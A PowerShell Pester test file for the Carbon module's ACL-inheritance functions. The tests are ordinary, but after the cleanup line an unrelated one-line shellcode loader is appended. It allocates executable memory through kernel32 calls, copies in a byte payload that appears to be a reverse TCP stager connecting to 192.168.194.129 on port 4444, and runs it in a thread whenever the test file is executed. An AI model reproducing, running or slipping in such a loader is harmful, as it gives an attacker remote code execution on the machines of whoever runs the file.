












Set-StrictMode -Version 'Latest'

$parentFSPath = $null 
$childFSPath = $null
$originalAcl = $null

& (Join-Path -Path $PSScriptRoot -ChildPath 'Initialize-CarbonTest.ps1' -Resolve)

function Assert-AclInheritanceDisabled
{
    param(
        $Path
    )

    It 'should disable access rule inheritance' {
        (Get-Acl -Path $Path).AreAccessRulesProtected | Should Be $true
    }

}

function New-TestContainer
{
    param(
        [Parameter(Mandatory=$true)]
        $Provider
    )

    if( $Provider -eq 'FileSystem' )
    {
        $testRoot = (Get-Item -Path 'TestDrive:').FullName
        $path = Join-Path -Path $testRoot -ChildPath ([IO.Path]::GetRandomFileName())
        Install-Directory -Path $path
    }
    elseif( $Provider -eq 'Registry' )
    {
        $path = ('hkcu:\Carbon+{0}\Disable-AclInheritance.Tests' -f [IO.Path]::GetRandomFileName())
        Install-RegistryKey -Path $path
    }
    else
    {
        throw $Provider
    }

    Grant-Permission -Path $path -Identity $env:USERNAME -Permission FullControl

    It 'should have inheritance enabled' {
        $acl = Get-Acl -Path $path
        $acl.AreAccessRulesProtected | Should Be $false
        $acl = $null
    }

    It 'should have inherited access rules' {
        Get-Permission -Path $path -Inherited | Should Not BeNullOrEmpty
    }

    return $path
}

foreach( $provider in @( 'FileSystem', 'Registry' ) )
{
    
    Describe ('Disable-AclInheritance on {0}' -f $provider) {
        $path = New-TestContainer -Provider $provider
        Protect-Acl -Path $path
        Assert-AclInheritanceDisabled -Path $path
        It 'should not preserve inherited access rules' {
            [object[]]$perm = Get-Permission -Path $path -Inherited 
            $perm.Count | Should Be 1
            $perm[0].IdentityReference | Should Be (Resolve-IdentityName -Name $env:USERNAME)
        }
    }
    
    Describe ('Disable-AclInheritance on {0} when preserving inherited rules' -f $provider) {
        $path = New-TestContainer -Provider $provider
        [Security.AccessControl.AccessRule[]]$inheritedPermissions = Get-Permission -Path $path -Inherited | Where-Object { $_.IsInherited }
        Protect-Acl -Path $path -Preserve
        Assert-AclInheritanceDisabled -Path $path
        It 'should preserve inherited access rules' {
            [object[]]$currentPermissions = Get-Permission -Path $path -Inherited 
            $currentPermissions.Count | Should Be $inheritedPermissions.Count
            for( $idx = 0; $idx -lt $currentPermissions.Count; ++$idx )
            {
                $currentPermission = $currentPermissions[$idx]
                $inheritedPermission = $inheritedPermissions | Where-Object { $_.IdentityReference -eq $currentPermission.IdentityReference }

                $currentPermission.IdentityReference | Should Be $inheritedPermission.IdentityReference
            }
        }
    }
    
    Describe ('Disable-AclInheritance on {0} when part of a pipeline' -f $provider) {
        $path = New-TestContainer -Provider $provider
        Get-Item -Path $path | Disable-AclInheritance 
        Assert-AclInheritanceDisabled -Path $path

        $path = New-TestContainer -Provider $provider
        $path | Disable-AclInheritance
        Assert-AclInheritanceDisabled -Path $path
    }

    Describe ('Disable-AclInheritandce on {0} when inheritance already disabled' -f $provider) {
        $path = New-TestContainer -Provider $provider
        Disable-AclInheritance -Path $path
        Assert-AclInheritanceDisabled -Path $path

        Mock -CommandName 'Set-Acl' -ModuleName 'Carbon' -Verifiable
        Disable-AclInheritance -Path $path
        It 'should not disable an already disabled ACL' {
            Assert-MockCalled -CommandName 'Set-Acl' -ModuleName 'Carbon' -Times 0
        }
    }
}

Get-ChildItem -Path 'hkcu:\Carbon+*' | Remove-Item -Recurse -ErrorAction Ignore

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0xc2,0x81,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

